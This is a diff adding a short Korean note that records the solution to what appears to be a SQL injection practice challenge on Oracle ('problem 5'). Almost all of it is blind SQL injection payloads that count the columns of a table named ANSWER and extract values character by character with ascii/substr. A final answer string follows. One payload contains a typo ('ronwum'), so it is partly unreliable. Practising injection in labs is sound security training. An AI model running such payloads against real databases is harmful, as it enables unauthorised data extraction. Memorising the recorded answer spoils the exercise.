@@ -1,0 +1,17 @@
+=================================
+
+* SQL Injection Oracle 문제 5번
+
+=================================
+
+1.
+ad%' AND (SELECT COUNT(*) FROM USER_TAB_COLUMNS WHERE TABLE_NAME='ANSWER') = 5 AND 'j%'='j
+ad%' AND (select count(column_name) from cols where table_name = 'ANSWER') =5 AND 'j%'='j
+ad%' AND (select ascii(substr(c,1,1)) from (select column_name c, rownum l from cols where table_name = 'ANSWER') where l >99) >0  AND 'j%'='j
+ad%' AND ((select ascii(substr(a,1,1)) from (select answer a, ronwum b from ANSWER) where b = 1) > 0) >0  AND 'j%'='j
+
+
+2. 
+ant6
+
+==================================
